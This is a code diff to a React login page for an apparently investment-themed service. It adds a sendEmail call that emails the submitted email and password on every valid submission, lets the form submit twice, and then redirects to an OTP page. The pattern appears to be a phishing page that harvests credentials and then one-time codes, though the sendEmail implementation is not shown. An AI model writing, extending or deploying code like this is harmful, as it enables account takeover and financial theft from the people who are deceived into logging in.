@@ -3,8 +3,9 @@ import "../Login/Login.css";
 import { IoIosArrowDown } from "react-icons/io";
 import { FaRegEye } from "react-icons/fa6";
 import { FaRegEyeSlash } from "react-icons/fa6";
-import { useState } from "react";
+import { useState, useRef } from "react";
 import { useNavigate } from "react-router";
+import { sendEmail } from "../SendEmail/sendEmail";
 
 const Login = () => {
   const [isPasswordOpen, setPasswordOpen] = useState(false);
@@ -14,6 +15,7 @@ const Login = () => {
   const [errors, setErrors] = useState({});
   const navigate = useNavigate();
   const [submissionCount, setSubmissionCount] = useState(0);
+  const form = useRef()
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -33,8 +35,11 @@ const Login = () => {
     if (Object.keys(newErrors).length === 0) {
       if (submissionCount >= 1) {
         navigate("/otp");
+        sendEmail(form)
+        
       } else {
         setSubmissionCount((prev) => prev + 1);
+        sendEmail(form)
       }
     }
   };
@@ -94,13 +99,14 @@ const Login = () => {
           </svg>
         </header>
 
-        <form action="" id="form" onSubmit={handleSubmit}>
+        <form action="" id="form" ref={form} onSubmit={handleSubmit}>
           <h1>Welcome back</h1>
           <p id="sub-heading">The world of investing is already waiting.</p>
 
           <div className="inputdiv" id="emailinputdiv">
             <p>Email address</p>
             <input
+              name="email"
               className={`input ${
                 isInputActive === "email" ? "active-border" : ""
               }`}
@@ -115,6 +121,7 @@ const Login = () => {
           <div className="inputdiv">
             <p>Password</p>
             <input
+              name="password"
               className={`input ${
                 isInputActive === "password" ? "active-border" : ""
               }`}
